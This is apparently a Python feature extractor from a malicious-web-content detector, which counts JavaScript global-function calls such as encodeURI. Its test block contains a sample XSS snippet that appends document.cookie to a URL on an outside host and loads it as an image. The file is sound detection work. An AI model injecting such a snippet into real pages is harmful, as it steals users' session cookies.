from src.static_features.js import *


class GlobalFuncJS(JSExtractor):
    def __init__(self, web_data):
        super().__init__(web_data)
        self.meta = ExtractorMeta(
            "js",
            "GlobalFuncJS",
            "InfectedWebContent2017",
            "一些全局函数的使用次数",
            "1.0",
        )

    def extract(self) -> FeatureExtractionResult:
        js_content_list = self.web_data.content["js"]
        info_dict = {}
        for h in js_content_list:
            start_time = time.time()
            res = extract(h["content"])
            info_dict[h["filename"]] = {
                "count": res,
                "time": time.time() - start_time,
                "additional_info": {},
            }
        return FeatureExtractionResult(self.meta.filetype, self.meta.name, info_dict)


def extract(js_content: str) -> int:
    # 定义全局函数和正则表达式
    functions = [
        "parseInt",
        "parseFloat",
        "decodeURIComponent",
        "decodeURI",
        "encodeURI",
        "encodeURIComponent",
    ]
    # 匹配完整的、独立的func字符串，而不是作为其他字符串的一部分。r"\b"表示单词的开始或结束边界。
    regex_patterns = [re.compile(r"\b" + func + r"\b") for func in functions]

    # 统计每个函数的使用次数
    counts = {
        func: len(pattern.findall(js_content))
        for func, pattern in zip(functions, regex_patterns)
    }
    total_count = sum(counts.values())
    return total_count


if __name__ == "__main__":
    js_content = """
    <script language="javascript">
    var url = "http://www.trusted.com/index.html?cookie=";
    url = url + encodeURI(document.cookie);
    document.getElementById("pic").src=url;</script>
    """
    res = extract(js_content)
    print(f"js global functions count:{res}")
